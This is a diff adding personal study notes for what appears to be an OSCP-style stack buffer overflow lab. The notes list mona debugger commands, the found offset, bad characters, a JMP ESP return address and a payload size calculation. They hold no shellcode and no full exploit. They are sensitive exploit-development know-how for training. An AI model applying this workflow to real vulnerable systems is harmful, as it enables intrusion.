@@ -1,0 +1,70 @@
+!mona commands:
+
+1. !mona config -set workingfolder c:\mona\%p
+
+2. !mona findmsp -distance 600
+
+3. !mona bytearray -b "\x00"
+
+4. !mona compare -f C:\mona\oscp\bytearray.bin -a <address>
+
+5. !mona bytearray -b "\x00\xbadchar"
+
+6. !mona jmp -r esp -cpb "\x00"
+
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+see: BOF tutorial by hacking article
+
+at 700 byte --> crashed   
+
+arbitary bytes payload made --> 700 byte
+
+offset --> 634
+
+shellcode --> 351 byte
+
+
+Address	          Status                   BadChars
+0x0182fa30  Corruption after 6 bytes   00 23 24 3c 3d 83 84 ba
+				       => \x00\x23\x24\x3c\x3d\x83\x84\xba
+				        => \x00\x23\x3c\x83\xba   
+					(as bad char tends to currupt next char as
+					 well that doesn't mean that adjucent char
+					  is corrupted)  -> 24 3d 84 are victims
+ Type	    Location
+ normal      Stack
+
+
+ret addr: 0x625011D3  => LSB --> \xD3\x11\x50\x62   
+625011C7
+
+payload = 
+
+prefix + 1978 + 4 + 16 + 351 ---> 2349 + prefix --> 2349 + 10 --> 2359  (<= 2400)
+
+______________________________________________________________________
+
+
+at 700 byte --> crashed
+
+payload made --> 700 byte  
+
+-----> Technically, it would also work, to find the offset but if it was taken, 
+       making payload would be difficult.
+
+_____________
+
+kali@reveng ~/T/B/OVERFLOW2> msf-pattern_offset -l 700 -q 76413176
+[*] Exact match at offset 634
+
+kali@reveng ~/T/B/OVERFLOW2> msf-pattern_offset -l 1000 -q 76413176
+[*] Exact match at offset 634
+------------
+
+offset --> 634  => min. byte to overflow buffer/stack
+
+crashed at --> 700 => offset present b/w 600 and 700 according to fuzzing script
+
+
+
+
